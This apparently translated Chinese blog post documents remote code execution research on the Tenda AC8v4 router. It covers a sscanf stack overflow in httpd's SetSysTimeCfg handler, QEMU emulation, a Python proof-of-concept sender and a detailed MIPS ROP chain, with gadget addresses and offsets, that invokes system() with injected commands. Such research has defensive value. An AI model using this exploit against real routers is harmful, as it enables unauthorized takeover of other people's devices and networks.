#  Tenda Ac8v4 RCE漏洞挖掘与分析   
3bytes  3072   2024-08-07 10:19  
  
## /bin/httpd：服务还是陷阱  
  
漏洞利用开始于tenda.com最新固件的热门Ac8v4路由器；通过访问官方固件下载页面 https://www.tenda.com.cn/download/detail-3518.html；解压固件后，你应该会看到类似这样的内容；其中有一个.docx文件介绍了如何安装固件，还有一个神秘的.bin文件：  
```
 🐈 V16.03.34.06 tree
    .
    ├── AC8V4 xxxx.docx
    └── US_AC8V4.0si_V16.03.34.06_cn_TDC01.bin

```  
  
这里的US_AC8V4.0si_V16.03.34.09_cn_TDC01.bin文件是Ac8v4的固件系统！通过安装squashfs后使用Binwalk -Me，我们可以在squashfs-root看到整个路由器固件系统：  
```
 🐈 squashfs-root tree -L 1    
    .
    ├── .....
    ├── etc -> /dev/null
    ├── init -> bin/busybox
    ├── lib
    ├── mnt
    ├── proc
    ├── root -> /dev/null
    ├── sbin
    └── .....

```  
  
正如我们所看到的，Ac8v4固件内部具有与普通Linux相似的文件系统架构，其中包括/root、/proc、/bin、/etc等根目录，但我们也可以看到，其中一些文件系统路径指向/dev/null；这在模拟固件时需要一些技巧:) 查看这些二进制文件后，我发现了一个可疑的二进制文件httpd，它相当大；我们可以认为它是主要的二进制服务：  
  
使用IDA作为调试器，加载二进制文件后，我们可以看到一个巨大的集成API列表，例如websPageOpen、sslFreeConnection...以及其他未命名的API，例如sub_4222DC和sub_495368；但是，如何在大量API中找到可能的漏洞呢？魔法在于source-to-sink和排除websGetVar->解析远程发送数据到主机二进制文件的函数；  
  
经过一段时间的source-to-sink和思考，我们定位到一个可疑的API：sub_4A79EC，它似乎用于处理来自/goform/SetSysTimeCfg的连接调用链sub_4A79EC -> fromSetSysTime -> formDefineTendDa，定义了所有webform组件：  
```
int __fastcall sub_4A79EC(int a1)
{
  ....
  s = (char *)websGetVar(a1, "time", &unk_4F09E0);
  sscanf(s, "%[^-]-%[^-]-%[^ ] %[^:]:%[^:]:%s", v6, v8, v10, v12, v14, v16);
  v18.tm_year = atoi((const char *)v6) - 0x76C;
  v18.tm_mon = atoi((const char *)v8) - 1;
  ....
}

```  
  
如介绍的那样，websGetVar解析了a2 -> "time"来自监听webform/goform/SetSysTimeCfg，s直接解析为sscanf并存储到基于堆栈的变量中，例如v6、v8，这是非常危险的，因为这就是sscanf的工作原理：  
> sscanf()函数将数据从缓冲区读取到由参数列表提供的位置。如果缓冲区和格式字符串指向的字符串重叠，行为未定义。  
> 参数列表中的每个条目必须是与格式字符串中的相应转换规范匹配的类型的变量的指针。如果类型不匹配，结果未定义。  
> 格式字符串控制参数列表的解释。格式字符串可以包含以初始移位状态开始和结束的多字节字符。  
  
  
sscanf()实际做的是过滤arg1并将其拆分并保存到不同的基于堆栈的变量中；在我们的例子中，参数s被解析为time参数在(char *)websGetVar(a1, "time", &unk_4F09E0);，这里sscanf通过正则表达式%[^-]-%[^-]-%[^ ] %[^:]:%[^:]:%s过滤输入；将数据提取到v6或v9或v10或...作为data1:data2:data2或data1-data2-data3；这些变量位于堆栈上；更危险的是  
### Mipsel是最好的！  
  
readelf -h的结果告诉我们这个二进制文件是用Mips的小端架构构建的，要在这个架构上实际进行ROP，我们需要更多地了解这些命令的工作原理，而不仅仅是头文件速查表，并弄清楚如何在虚拟机上运行它们；首先，寄存器的工作方式如下：  
> "$a0" – "$a3"：**函数调用的参数。如果参数超过4个，多余的参数通过堆栈传递。**"$t0" - "$t7"：临时寄存器。"$s0" – "$s7"：保存的寄存器。使用它们时，需要将使用的寄存器保存到堆栈。"$gp"：**全局指针，用于访问32K范围内的数据。**"$sp"：堆栈指针，指向堆栈顶部。"$fp"：帧指针。"$ra"：存储返回地址。  
  
  
正如你所注意到的，Mips没有$bp寄存器，所有基于堆栈的操作都将通过$sp寄存器实现；此外，Mips中还存在leaf函数和non-leaf函数的概念，leaf函数调用其他外部函数作为API，non-leaf则不调用，但在我们的例子中，我们不需要过多关注这一点！此外，mips还支持许多立即操作，如addiu，如果你不熟悉这些，建议查看速查表，这将在我们的ROP部分大有帮助！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGKTU8En1lUTWmh7rj1ico6ARJSWXKmibnq8R2rcEwsDvHaM8TZ5rSbdDCGY5q2UUnGNMxwh9B3xS3w/640?wx_fmt=png&from=appmsg "")  
#### QEMU + 补丁：大脑模拟（我花了两天的事情）  
> 在开始之前，**在此任务中不要使用WSL2 / WSL，因为我保证预设网络配置不会工作（就像在MacBook的arm上运行steam一样）**，尝试使用Ubuntu-22.04 VMware可以为你节省大量时间。  
> 硬件虚拟化。它是一个托管虚拟机监视器：通过动态二进制转换来模拟机器的处理器，并为机器提供一组不同的硬件和设备模型，使其能够运行各种操作系统。由于动态翻译，QEMU无需主机内核驱动程序即可运行，并且性能可接受。它支持多种目标架构，包括但不限于x86、ARM、MIPS、PowerPC和SPARC，这使其成为开发、测试或简单运行不同架构软件的多功能工具。  
  
  
为了在与路由器相同的环境中运行MipselTenda Ac8v4映像而无需购买一个（我买了一个但在写这篇文章时仍在运输中）；我们需要利用QEMU作为我们支持多架构的MIPsel虚拟机。QEMU支持不同级别的模拟取决于你的情况，qemu-xxx-static允许你独立运行跨架构二进制文件，而qemu-system-xxx允许你运行整个文件系统，在我们的情况下，qemu-system将是最适合我们的，因为我们必须处理所有这些动态链接二进制文件和其他东西；不过，它也需要更多的努力才能运行。  
  
首先，我们需要处理一些ifconfig配置，qemu与localhost之间的通信总是会引起很多头痛，对我们来说  
  
，我们将尝试构建一个tun和tap设备；qemu虚拟机将/dev/net/tun设备作为文件描述符读取和写入，使用tap0网络接口卡与主机的协议栈交互（这在主机中需要一个桥br0）。  
```
apt-get install bridge-utils
apt-get install uml-utilities

ifconfig ens33 down                   # ens33 : switch it to your local interface
brctl addbr br0                          # Adding br0
brctl addif br0 ens33                 # Linking to br0
brctl stp br0 on                    # On stp
brctl setfd br0 2                    # forward delay
brctl sethello br0 1                # Hello time
ifconfig br0 0.0.0.0 promisc up        # enable br0
ifconfig ens33 0.0.0.0 promisc up    # enable local interface
dhclient br0                        # obtain br0's IP via dhclient

brctl show br0                        # ls br0
brctl showstp br0                    # show info of br0

tunctl -t tap0                        # add tap0
brctl addif br0 tap0                # link to br0
ifconfig tap0 0.0.0.0 promisc up    # enable tap0
ifconfig tap0 192.168.x.x/24 up        # assign an ip for tap0 (x in subnet)

brctl showstp br0                    # show br0's interface

```  
  
现在，如果你检查 br0 的信息，你会发现 tap0 当前是 disable 的；在我们启动 qemu-system 之后，它会变成 forwarding；此外，br0、tap0 和你的本地接口应该在同一个子网中。接下来，我们来构建 qemu-system-mipsel，我们需要在 people.debian.org 安装 debianmipsel 镜像：  
```
wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-2.6.32-5-4kc-malta
wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta

```  
  
之后，我们可以像这样启动我们的 qemu-system-mipsel 模拟：  
```
sudo qemu-system-mipsel \
    -M malta \
    -kernel vmlinux-3.2.0-4-4kc-malta \
    -append "nokaslr root=/dev/sda1" \
    -hda debian_wheezy_mipsel_standard.qcow2 \
    -net nic -net tap,ifname=tap0,script=no,downscript=no \
    -nographic

```  
  
-net nic 选项表示 QEMU 应该在虚拟机中创建一个虚拟网卡。-net tap 选项指定连接类型为 TAP，-ifname 指定网络接口名称（即之前创建的 tap0，本质上是将 QEMU 虚拟机连接到网桥）。script 和 downscript 选项用于告诉 QEMU 是否在系统启动时自动调用脚本来配置网络环境。如果这两个选项为空，QEMU 会自动选择第一个不存在的 TAP 接口（通常是 tap0）作为参数，并在启动和停止时调用 /etc/qemu-ifup 和 /etc/qemu-ifdown 脚本。由于我们已经配置好了一切，可以将这两个参数设置为 no。  
  
初始化后（默认用户名和密码为 root），eth0 不会默认自动分配一个 ip 地址，我们可以手动分配一个，例如 ifconfig eth0 192.168.x.x/24 up（注意将 x 更改为子网中的空闲地址）。现在我们使用 scp 命令上传 squashfsbinwalk 解压后的固件，当我们在 /root 解压文件系统时，确保通过 mount -o bind /dev /root/dev && mount -t proc /proc /root/proc 挂载 /dev 和 /proc 到文件系统。然后使用 chroot /root sh 进入 Tenda Ac8v4 的文件系统根目录；  
  
现在，如果你运行漏洞文件 ./bin/httpd，你可能会发现两个问题；第一个问题告诉你某些 libc 文件和符号不存在，可以通过将其添加到环境中来轻松修复，即 export LD_LIBRARY_PATH=/lib:$LD_LIBRARY_PATH。然而，第二个问题需要更多技巧，在正确设置 LD_LIBRARY_PATH 并启动程序后，你可能会发现程序在 Welcome to ... 之后卡住，没有任何网络绑定提示。  
  
如果你在 IDA 中搜索字符串 welcome，交叉引用该字符串会带你到 main()！问题的原因在于 ifaddrs_get_ifip()（你应该看到类似这样的代码）：  
```
  puts("\n\nYes:\n\n      ****** WeLoveLinux****** \n\n ****** Welcome to ******");
  setup_signals();
  while ( 1 )
  {
    lan_ifname = ifaddrs_get_lan_ifname();
    if ( ifaddrs_get_ifip(lan_ifname, v10) >= 0 )
      break;
    sleep(1u);
  }

```  
  
它卡住的原因是 ./bin/httpd 会运行一堆网络脚本，以确保路由器处于良好状态，然而，这些网络脚本并非必需，我们可以简单地通过在汇编中修补 ifaddrs_get_ifip 的返回值来绕过此断言；或者更简单地，直接跳到 loc_43B798：  
```
.text:0043B768                 lw      $gp, 0x6B8+var_6A8($fp)
.text:0043B76C                 bgez    $v0, loc_43B798  # <- j loc_43B798
.text:0043B770                 nop

```  
  
如果你不想使用 IDA Pro，不用担心！你可以在这里下载修补版本 -> github.com；现在替换原始的 ./bin/httpd，脚本应该继续运行，但其他问题将开始显现；当为 httpd 分配监听地址时，httpd 可能会说 '无法分配地址' 或监听在 255.255.255.255！这是怎么发生的？如果你搜索字符串 'httpd listen ip'；它会带你到 socketOpenConnection() 并返回到 main()  
```
  v4 = ifaddrs_get_lan_ifname();
  if ( ifaddrs_get_ifip(v4, v11) < 0 )
  {
    GetValue("lan.ip", v8);
    strcpy(g_lan_ip, v8);
    memset(v12, 0, 0x5E4u);
    if ( !file_lan_dhcpc_get_ipinfo_and_status(v12) && v12[0x8C] )
      strcpy(g_lan_ip, &v12[0x8C]);
  }

```  
  
其中 lan.ip 来自全局变量 g_lan_ip，通常从接口 br0 获取 ip；在我们的情况下，我们在 QEMU 中没有 br0 网桥接口（在 Ubuntu VMware 中确实有），因此我们必须使用类似 pre-qemu 设置的方法创建一个，使用 brctl 和 ifconfig；我们可以尝试自己手动分配地址，而不是使用 dhclient：  
```
brctl addbr br0                        # 添加 br0 接口
ifconfig br0 192.168.x.x/24 up        # 手动分配一个 IP 地址

```  
  
成功了！现在，在导出 LD_LIBRARY_PATH、修补 ifaddrs_get_ifip() 和构建 br0 接口后，重新运行 ./bin/httpd 文件；现在终于，正如 httpd - web.c:158 调试信息显示的那样，绑定到正确的 ip 和 port，我们可以直接在浏览器中访问它，并且可以看到 Tenda Ac8v4 的主页！  
## $a0+$t9：溢出和流量控制  
### 溢出  
  
在设置 Tenda Ac8v4 的 qemu-system 级别模拟后，是时候将其付诸实践了！但在我们开始之前，为 ./bin/httpd 提供一个 gdbserver 会对我们有很大帮助！首先，确保你在 https://github.com/lucyoa/embedded-tools/tree/master/gdbserver 获取最新的 gdbserver 二进制文件，也确保你下载与 QEMU 虚拟机对应的正确架构，在我们的例子中，我们选择 gdbserver-7.7.1-mipsel-mips32-v1 来托管；通过 wget 或 scp 下载并 chmod +x 后，使用 ./gdbserver 0.0.0.0:[PORT_YOU_WANT] ./bin/httpd 开始服务！由于我们在 mipsel 上调试，我们需要 gdb-multiarch 进行调试（安装命令 apt install gdb-multiarch）；之后，你可以通过 gdb-multiarch -q ./bin/httpd 连接到此服务器，然后 target remote [address]:[port]；确保在连接后 continue。  
> 如果你在连接到 gdbserver 时遇到错误，尝试在 chroot . sh 到固件之前重新挂载 /proc，命令为 mount -t proc /proc /root/proc :)  
  
  
在设置 gdbserver 后，我们可以通过 /goform/SetSysTimeCfg 进行基于堆栈的溢出利用作为概念验证！我创建了这个 poc.py 脚本来首先测试溢出：  
```
def sink(        host,        port,        payload    ):

    import requests
    url = "http://{host}:{port}/goform/SetSysTimeCfg"
    _payload = b''
    _payload = b'retr0reg' + b":" + payload
    data = {
        b"timeType":b"manual",
        b"time":_payload
    }

    def send_request():
        try:
            requests.post(url=url, data=data)
        except Exception as e:
            print(f"Request failed: {e}")

    send_request()

```  
  
对于我们的初始负载，我们可以使用集成在 pwndbg 中的 cyclic 来生成一个负载；发送一个相当大的负载后，我们可以看到程序由于无效返回地址而收到 段错误，这首先允许我们在组件 ./bin/httpd 上引起 DoS 并使路由器停止工作！  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGKTU8En1lUTWmh7rj1ico6AEgUG1JKXyZg8DkyrTgG9FgQ0kKdK91ZNE7RLs9AqhLAHtNaXkO4xug/640?wx_fmt=png&from=appmsg "")  
  
此时，使用 pwndbg 集成的 cyclic -l 可以让我们计算被劫持的流控制偏移量相对于我们发送的数据；我们可以知道控制流的迁移发生在 偏移量 123，b'bgaa' (hex: 0x62676161)；这意味着将该偏移量替换为指针允许我们将控制流操纵到该地址，以此为基础，我们可以开始我们的高级 ROP 并实现我们的最终目标：远程代码执行。  
### MIP ROP: 指针世界  
  
对于 mips 架构，ROP 将是一个不同于我们在 Intel 语法中最熟悉的 ROP 的主题；MIPS 架构使用不同的机制来实现函数返回。具体来说，MIPS 使用寄存器和跳转指令来实现函数返回，主要通过 jal 和 ja $ra，因为它们主要关注 $sp 的使用；因此在 mips 的 ROP 中，我们不能总是使用如 pop rdi, ret 这样的 gadgets 来控制执行流，而是要更多地关注 寄存器 和 指针；这使得 ROP 更加困难，因为在 gadgets 之间频繁变化的 $sp 上需要进行大量的预设置和改变，此外这也使得我们在预先计划堆栈 gadgets 和目标时更加混乱。  
  
首先，由于提供给我们的 IDA Pro 的 mipsrop 插件非常出色，我们可以扫描可用的 Gadgets 以进行 ROP 流控制。为了更大的利用空间，我们决定将重点放在 lib/libc.so 动态链接库上作为我们的 gadget 库，而路由器文件系统未受 ASLR 保护（如果受保护我们可以通过 ROP 泄漏），我们可以将它们调用到固定的 libc_base 偏移量；在我们的例子中，通过 vmmap 知道 libc_base 对于 libc.so -> (77f59000-77fe5000 r-xp 00000000 08:01 788000) 位于 77f59000。知道这一点后，我们可以尝试找到用于流控制的 gadgets。  
#### 尝试 1：$a0 操作  
  
Mipsrop 为我们提供了 misrop.system() 方法，用于定位 $a0 修改与相应的流控制 gadget 它们排列得非常接近。在我们的案例中，我们在 libc.so 中找到了这两个：  
```
Python>mipsrop.system()
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
|  0x0004D144  |  addiu $a0,$sp,0x24+var_C                            |  jr    0x24+var_s0($sp)                |
|  0x00058920  |  addiu $a0,$sp,0x28+var_C                            |  jr    0x28+var_4($sp)                 |
----------------------------------------------------------------------------------------------------------------

```  
  
正如这两个 gadget 在 0x0004D144 和 0x00058920 所示，它们都允许我们通过寄存器 $sp（addiu x,y,z = x = y+z）在堆栈上的偏移量控制寄存器 $a0（第一个参数寄存器），同时直接 jr（跳转）到另一个由 $sp 控制的堆栈偏移量；这允许我们在通过我们可以控制的堆栈数据控制流到另一个调用函数之前控制 $a0 用于参数传递！例如，在 libc.so 中的 gadget 0x0004D144，我们可以首先将 $pc 填充为 libc_base + 0x0004D144 ，将预期的 $a0 值填充到 $sp 的偏移量 0x24+var_C（此值等于 0x24 - 0xC = +0x24），然后将 $sp 偏移量 0x24+var_s0（0x24+0）填充到 jr 跳转地址；创建这样的堆栈结构：  
```
+------offset------+------value------+
|     ret_addr     +  gadget 0x4D144 |
|------------------+-----------------|
|     $sp+0x18     +    $a0_addr     |
|------------------+-----------------|
|     $sp+0x24     +    jr_addr         |
+------------------+-----------------+

```  
  
现在我们知道 $pc 寄存器在 偏移量 123（b'bgaa' (hex: 0x62676161)） 通过 cyclic 得出，也知道 $sp 在 偏移量 127（b'bhaa' (hex: 0x61616862)）；此外，我们还需要找到 ROP 的目标，在这种情况下，由于我们已经通过 vmmap（/proc/<pid>/maps）获得了 libc_base 地址，并通过 cyclic 模式字符串获得了 $pc 和 $sp 偏移量；此外，我们还需要找到 ROP 的目标，在这种情况下，由于我们已经通过 vmmap（/proc/<pid>/maps）获得了 libc_base 地址，并通过 cyclic 模式字符串获得了 $pc 和 $sp 偏移量；我们将 jr_addr 操作为 libc_base + _system（libc.so 的 system 符号），同时将 $sp+0x30 操作为传递到 _system 的 $a0，即命令字符串；这将为我们提供第一个利用：  
```

    def _rop(ropcmd: RopCmd):

        # 77f59000-77fe5000 r-xp 00000000 08:01 788000 
        libc_base = 0x77f59000

        ret_offset = 0x7b # --> b'bgaa'
        sp_offset  = 0x7f # --> b'bhaa'

        _system = 0x004E630


        a0_EQ_sp24_c_JR_24sp  = 0x0004D144 # addiu $a0,$sp,0x24+var_C | jr 0x24($sp)
        # LOAD:0004D144                 addiu   $a0, $sp, 0x24+var_C
        # LOAD:0004D148                 lw      $ra, 0x24+var_s0($sp)
        # LOAD:0004D14C                 nop
        # LOAD:0004D150                 jr      $ra


        a0_EQ_sp28_c_JR_24sp  = 0x00058920 # addiu $a0,$sp,0x28+var_C | jr 0x24($sp)
        # LOAD:00058920                 addiu   $a0, $sp, 0x28+var_C
        # LOAD:00058924                 lw      $v1, 0x28+var_C($sp)
        # LOAD:00058928                 lw      $ra, 0x28+var_4($sp)
        # LOAD:0005892C                 sw      $v1, 0($s0)
        # LOAD:00058930                 lw      $s0, 0x28+var_8($sp)
        # LOAD:00058934                 jr      $ra

        _payload = {
                ret_offset: libc_base + a0_EQ_sp24_c_JR_24sp,
                (sp_offset + 0x18): b'`mkdir /retr0reg`',
                (sp_offset + 0x24): libc_base + _system,
            }

        return flat(_payload)

```  
  
在这里，我们使用 pwntools 的 flat 方法构建了我们的 ROP 负载，这避免了大量的 'payload +='，p32() 操作，并通过偏移量作为字典轻松构建负载；我们通过 vmmap（/proc/<pid>/maps）获得的 libc_base 和通过 cyclic 模式字符串获得的 $pc 和 $sp 偏移量；该 ROP-Chain 应该可以工作，因为 $pc 变为 `libc_base + a0_EQ_sp24_c  
  
_JR_24sp；$a0将被mov到sp_offset + 0x18，其中存储我们的RCE Command，然后jr进入libc_base + _system的libc system()API。现在我们可以直接通过我们构建的sink()发送展平的_payload`；让我们看看会发生什么...  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGKTU8En1lUTWmh7rj1ico6AGCTho0JqgfjrUNJUl7sPduucEFwNg94t1JUWNmdHjicFUEVc5GBP6cg/640?wx_fmt=png&from=appmsg "")  
  
  
好吧，./bin/httpd 在 0x77fa7640 收到了 SIGSEGV，这离 libc_base + _system: 0x77fa7630 只有几个命令的距离，一方面这表明我们控制了流到目标 libc_base + _system 符号加载在 libc.so 中，并且 $a0 寄存器确实修改为指向 0x646b6d60 的堆栈地址。然而，加载的 libc 符号 system 似乎没有正常工作，因为在 0x77fa7640 停止，因为 lw $t9, -0x7f90($gp) 引发了 SIGSEGV；但为什么呢？  
  
这个问题的答案隐藏在当前的命令中：lw $t9, -0x7f90($gp)，编译器试图从全局寄存器 $gp 的负偏移量 -0x7f90 处加载字（lw）。这对于 libc 来说是正常的操作，以便在当前符号中加载其他调用的符号，例如这里如果你查看 libc.so 在 IDA Pro 中的反编译版本，你会发现此命令正在从全局符号加载 memset。然而，由于先前的直接溢出组件，此处的 $gp 寄存器似乎未正确设置，导致 CPU 访问非法地址 0x7800f34c - 这在 vmmap 段中甚至不存在！触发了 CPU 的 SIGSEGV 段错误。  
#### 尝试 2：$a0 + $t9？  
  
为了解决阻碍我们的这个问题，我们将不得不找到一种方法使 $gp-0x7f90 成为合法地址 - 最好是指向已加载的 libc 中符号 memset 的准确地址；这里有一些有趣的地方，如果你查看 system() 符号初始化或加载时的段落，例如：  
```
LOAD:0004E630                 li      $gp, (unk_9C2D0+0x7FF0 - .)
LOAD:0004E638                 addu    $gp, $t9
LOAD:0004E63C                 addiu   $sp, -0x450
LOAD:0004E640                 la      $t9, memset

```  
  
不幸的是，li 指令阻止了通过 ROP 在调用 system() 之前直接修改 $gp 的可能性，因为这里 $gp 将作为立即数值加载（(unk_9C2D0+0x7FF0 - .)）；然而，进一步查看，你会发现 addu $gp, $t9，这告诉我们实际的原因是寄存器 $t9。这既是好消息又是坏消息。一方面，找到通过堆栈值修改 $gp 并 jmp 到另一个堆栈值的 gadget 几乎是不可能的，因为 $gp 几乎无法通过堆栈值进行修改，而找到 $t9 将容易得多。另一方面，我们可能需要构建一个全新的 ROP-chain 来进行利用。  
  
但在设计一个修改 $t9 寄存器的链之前，最好先检查一下什么值适合 $t9：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZEkT0Rn34yGKTU8En1lUTWmh7rj1ico6A4icdsRoYdia7vhcPg2EiawpsVBBQFOLpP5nIkWWcqzJdeiaicuIwyiayYcCw/640?wx_fmt=png&from=appmsg "")  
  
通过在 0x77f59000+0x004E630 处设置断点（system()）；我们可以发现，尽管调用了不同的命令作为 $a0，但 $t9 寄存器将始终设置为这个魔法地址 - 0x77fa7630，它恰好是 system() 符号的起始命令；还使 $t9, -0x7f90($gp) 成为 libc.so 分配内存中的合法地址 -> 0x77ff4000 0x77ff6000 rw-p 2000 8b000 /lib/libc.so；现在是时候为我们构建带有 $t9 操作的 ROP-Chain，同时允许 $a0 为 任意 并 jmp 到已加载的 system() 在 libc 中。  
  
百万美元的问题是：我们如何在允许我们最终 jmp 到我们之前的 $a0 获取 shell gadget 的同时控制 $t9；嗯，这需要另一种 mipsrop-ing。通过搜索 move $t9；我们可以找到大量符合我们期望的 $t9 修改 gadget，无论是通过直接赋值还是通过寄存器的间接方式：  
```
Python>mipsrop.find('move $t9')
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
# tons of indentical gadgets at different address in libc.so.....
|  0x0006D970  |  move $t9,$s4                                        |  jr    $s4                             |
|  0x0006EFA0  |  move $t9,$s3                                        |  jalr  $s3                             |
|  0x0006EFD0  |  move $t9,$s3                                        |  jalr  $s3                             |
|  0x00070E14  |  move $t9,$s2                                        |  jalr  $s2                             |
|  0x00072E00  |  move $t9,$s3                                        |  jalr  $s3                             |
|  0x00075474  |  move $t9,$v0                                        |  jr    $v0                             |
|  0x00078190  |  move $t9,$s1                                        |  jalr  $s1                             |
|  0x000783D0  |  move $t9,$s1                                        |  jalr  $s1                             |
|  0x000784DC  |  move $t9,$s1                                        |  jalr  $s1                             |
|  0x0007A19C  |  move $t9,$t1                                        |  jalr  $t1                             |
|  0x0007A1B4  |  move $t9,$t0                                        |  jalr  $t0                             |
|  0x0007EA1C  |  move $t9,$t0                                        |  jalr  $t0                             |
|  0x0007EBD8  |  move $t9,$s2                                        |  jalr  $s2                             |
|  0x0001B014  |  move $t9,$s4                                        |  jr    0x1C+var_s18($sp)               |
----------------------------------------------------------------------------------------------------------------

```  
  
然而，为了满足要求，使我们能够将 $a0 改变器和 stack-caller 跳转到堆栈上的其他 gadget，只有 0x0001B014 这个 gadget 能够按我们预期的方式工作！它首先将寄存器 $s4 的值移动到 $t9，然后跳转到堆栈地址 0x1C+var_s18($sp) ($sp + 0x1C + 0x18)，该地址将存储先前的 a0_EQ_sp24_c_JR_24sp。  
  
然而，在触发 0x0001B014 之前，还需要寻找对 $s4 寄存器的操作；这相对容易一些，因为 $s4 是堆栈控制中非常常见的中间寄存器；我们将继续使用 mipsrop.find() 找到符合 mipsrop.find('.* $s4') 的 gadgets，因为 $s4 是被操作的寄存器：  
```
Python>mipsrop.find('.* $s4')
----------------------------------------------------------------------------------------------------------------
|  Address     |  Action                                              |  Control Jump                          |
----------------------------------------------------------------------------------------------------------------
# 70 lines that fits our requirement....
|  0x0007E8C8  |  lw $s4,0x38+var_s10($sp)                            |  jr    0x5C($sp)                       |
|  0x0007EB5C  |  lw $s4,0x44+var_s10($sp)                            |  jr    0x5C($sp)                       |
----------------------------------------------------------------------------------------------------------------

```  
  
这次 mipsrop.find 为我们返回了大量的 gadgets！幸运的是，这些都包含了 stack-caller gadgets，比如 jr 0x5C($sp)，还允许我们通过 $sp 控制 $s4，如 0x38+var_s10($sp)；这次，我们将简单地选择一个看起来不错的，同时在堆栈上留有更多空间，地址冲突更少的 gadget，比较 0x0007EB5C，0x0007E8C8 给我们留下了额外的空间*((0x44+0x10)-(0x38-0x10)=0x2c)*给 $s4（对于 $s4 来说并不重要）。  
  
现在，我们可以通过 $s4 控制 $t9，它来自 0x44+var_s10($sp)，将作为 gadget0 通过 ret_addr 设置；我们现在可以指定 jr 地址为 move $t9,$s4，jr 0x1C+var_s18($sp) 指向 addiu $a0,$sp,0x24+var_C，它将从 sp+0x24+0xC 获取 $a0，然后 jr 到 0x24+var_s0($sp) 指向的地址。  
  
现在，我们可以构建有效载荷，如下所示：  
```
+------offset------+------value---------------------------------------+ <|-- g0
|     ret_addr     |  lw $s4,0x38+var_s10($sp) + jr 0x5C($sp))        | ---
|------------------+--------------------------------------------------|   |
|     $sp+0x24     |  libc_base + system()                              |   |
|------------------+--------------------------------------------------|   | g1
|     $sp+0x30     |  command_for_$a0                                  |   |
|------------------+--------------------------------------------------|<|-|---
|     $sp+0x34     |  addiu $a0,$sp,0x24+var_C + jr 0x24+var_s0($sp)  |   |  |
|------------------+--------------------------------------------------|   |  |
|     $sp+0x48     |  #s4_content                                      |   |  | g2
+------------------+--------------------------------------------------|<|-|  |
|     $sp+0x5C     |  move $t9,$s4 + jr 0x1C+var_s18($sp)              |-------
+------------------+--------------------------------------------------+

```  
#### 试验 3：邪恶的 $sp  
  
现在，如果我们简单地使用之前通过 cyclic 获取的 sp_offset 将这些 gadgets 和操作数据在堆栈上对齐，你会发现一个非常有趣的现象：它根本不起作用！但为什么呢？让我们回顾一下之前收集的这些 gadgets。看看我们之前和现在的第一个 gadget，我们的 return_addr 将直接指向，除了我们看到的 lw $s4,0x44+var_s10($sp); jr 0x5C($sp) 部分，实际上还有一个隐藏部分。  
  
IDA 允许我们通过双击地址来检查指定地址的指令，在我们的例子中，双击 0x0007E8C8，它将带我们到这里：  
```
LOAD:0007EB5C loc_7EB5C:
LOAD:0007EB5C                 lw      $ra, 0x44+var_s18($sp)
LOAD:0007EB60                 lw      $s5, 0x44+var_s14($sp)
LOAD:0007EB64                 lw      $s4, 0x44+var_s10($sp)
LOAD:0007EB68                 lw      $s3, 0x44+var_sC($sp)
LOAD:0007EB6C                 lw      $s2, 0x44+var_s8($sp)
LOAD:0007EB70                 lw      $s1, 0x44+var_s4($sp)
LOAD:0007EB74                 lw      $s0, 0x44+var_s0($sp)
LOAD:0007EB78                 jr      $ra
LOAD:0007EB7C                 addiu   $sp, 0x60

```  
  
正如 0x0007E8C8 和 0007EB5C 所定义的，Action 和 Control Jump gadget 正如我们预期的那样；在 Action 和 Control Jump gadgets 之间，我们操纵跳转到的 gadget 还包含其他指令，例如这里，s1-s5 寄存器进一步影响我们溢出的堆栈内容；然而，最重要的是，即使在 jr $ra (0x44+var_s18($sp)) 指令之后，$sp 的修改仍然适用；这对我们意味着什么呢？这意味着我们有效载荷中的 $sp 指针需要重新构建，考虑到之前 gadget 引起的 $sp 上升或下降；例如，当我们的下一个 gadget 转到 0x0001B014，move $t9,$s4; jr 0x5C($sp) 时，$sp 已经上升了 0x60；实际的 0x5C($sp) 将是 sp_offset + 0x60 + 0x1C + 0x18 = sp_offset + 0x60 + 0x34；这同样适用于我们的 gadget1，它也通过 +0x38 改变了 $sp 指针：  
```
LOAD:0001B014                 move    $t9, $s4
LOAD:0001B018                 lw      $ra, 0x1C+var_s18($sp)
LOAD:0001B01C                 lw      $s5, 0x1C+var_s14($sp)
LOAD:0001B020                 lw      $s4, 0x1C+var_s10($sp)
LOAD:0001B024                 lw      $s3, 0x1C+var_sC($sp)
LOAD:0001B028                 lw      $s2, 0x1C+var_s8($sp)
LOAD:0001B02C                 lw      $s1, 0x1C+var_s4($sp)
LOAD:0001B030                 lw      $s0, 0x1C+var_s0($sp)
LOAD:0001B034                 jr      $ra
LOAD:0001B038                 addiu   $sp, 0x38

```  
  
此时，修改了 $sp 后，我们可以使用新的 $sp 偏移重新构建我们的有效载荷，该偏移由这些 gadget 的调用顺序决定，导致我们的 rop chain 为：lw $s4 0x48; jr 0x5c -> move $t9,$s4 jr 0x34($sp) -> addiu $a0,$sp,0x28+var_C | jr 0x24($sp); 使用定义的 $sp  
- sp_offset -> 0x7f: defined at sink.  
  
- sp2 -> 0x60 : addiu $sp, 0x60.  
  
- sp3 -> 0x38 : addiu $sp, 0x38.  
  
```

        _payload = {
                ret_offset: libc_base + lw_s4_0x48_JR_5Csp, # gad0
                (sp_offset + 0x48): t9_target,
                (sp_offset + 0x38 + 0x18): f'{c2}'.encode(), # $s6, 0x38+var_s18($sp)
                (sp_offset + 0x5c): libc_base + t9_EQ_s4_JR_1C_p_18, # gad1
                (sp_offset + 0x60 + 0x1C + 0x10): f'{c1}'.encode(), 
                 # flow2 $s4-$s5 (caller), this is set via previous control-ed registers
                (sp_offset + 0x60 + 0x34): libc_base + a0_EQ_sp24_c_JR_24sp, 
                (sp_offset + 0x60 + 0x38 + 0x24): libc_base + _system, # gad2
                (sp_offset + 0x60 + 0x38 + 0x24 + 0xC - 0x7): f'$({c3});'.encode()
            }

```  
  
